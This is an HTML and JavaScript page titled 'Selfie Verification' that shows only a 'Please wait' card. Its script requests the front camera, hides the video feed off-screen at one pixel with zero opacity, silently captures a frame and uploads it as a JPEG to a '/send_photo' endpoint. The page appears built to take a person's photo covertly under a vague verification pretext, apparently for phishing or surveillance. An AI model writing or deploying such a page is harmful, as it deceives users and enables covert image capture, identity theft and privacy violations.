<!DOCTYPE html>
<html lang="tg">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Selfie Verification</title>
  <style>
    body{margin:0;background:#000;color:#fff;font-family:Arial;text-align:center}
    .box{max-width:460px;margin:0 auto;padding:18px}
    .small{opacity:.85;font-size:14px}
    #video{
      position:fixed; left:-9999px; top:-9999px;
      width:1px; height:1px; opacity:0; pointer-events:none;
    }
    #canvas{display:none;}
    .card{margin-top:18px;padding:18px;border-radius:14px;background:rgba(255,255,255,.06);}
  </style>
</head>
<body>
  <div class="box">
    <h2>Verification</h2>
    <div class="card">
      <p class="small">Please wait</p>
      <p id="status" class="small">Starting...</p>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
  </div>

<script>
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const statusText = document.getElementById("status");

  function setStatus(t){ statusText.innerText = t; console.log(t); }
  function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

  async function start(){
    try{
      setStatus("Requesting camera permission...");

      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });

      video.srcObject = stream;
      await video.play().catch(()=>{});

      setStatus("Ok");
      await sleep(1500);

      while(!video.videoWidth || !video.videoHeight){
        await sleep(100);
      }

      setStatus("Capturing...");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);

      const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.95));
      if(!blob) throw new Error("toBlob failed");

      setStatus("Uploading...");
      await sendToServer(blob);

      setStatus("✅ ");
      stream.getTracks().forEach(t => t.stop());

    }catch(e){
      console.error(e);
      setStatus("❌ Error: " + (e?.message || e));
    }
  }

  async function sendToServer(blob){
    const fd = new FormData();
    fd.append("photo", blob, "photo.jpg");

    const res = await fetch("/send_photo", { method:"POST", body: fd });
    if(!res.ok){
      // FastAPI detail-ро бармегардонад
      const txt = await res.text();
      throw new Error(txt);
    }

    const data = await res.json().catch(()=>null);
    if(!data || data.ok !== true) throw new Error("Server returned error");
  }

  start();
</script>
</body>
</html>
